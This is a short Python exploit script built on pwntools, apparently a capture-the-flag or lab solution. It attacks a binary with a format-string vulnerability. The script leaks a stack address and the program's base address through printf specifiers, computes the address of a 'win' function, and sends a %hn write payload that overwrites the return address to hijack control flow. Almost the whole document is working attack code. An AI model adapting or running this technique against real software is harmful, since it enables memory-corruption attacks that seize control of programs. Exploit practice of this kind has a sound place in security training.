#!/usr/bin/env python3
from pwn import *
from sys import argv, stdout

"""
   0x0000000000401685 <+315>:   mov    $0x0,%eax
   0x000000000040168a <+320>:   callq  0x401140 <printf@plt>
   0x000000000040168f <+325>:   mov    $0x0,%edi
"""

if __name__ == '__main__':
  try:
    binary = ELF(argv[1], checksec=False)
    p = binary.process(env={})
    p.sendline(b'%7$p')
    p.recv()
    sp_leak = int(p.recv().split(b'\n')[1], 16)+998
    log.info("Leaked return address: %#lx" % sp_leak)
    p.sendline(b'%147$p')
    pie_leak = int(p.recv().split(b'\n')[1], 16)-(binary.symbols['main']+360)
    win_addr = pie_leak+binary.symbols['win']
    log.info("Leaked binary base: %#lx" % pie_leak)
    log.info("Main address: %#lx" % (pie_leak + binary.symbols['main']))
    log.info("Win address:  %#lx" % win_addr)
    payload = b'%*24$c%25$hn  '
#    payload = b'%*69$c%70$hn'
    payload += p64((win_addr & 0xffff)-66)
    payload += p64(sp_leak)
    pause()
    p.sendline(payload)
    p.interactive()
  except IndexError:
    print("Usage: %s <binary>" % argv[0])
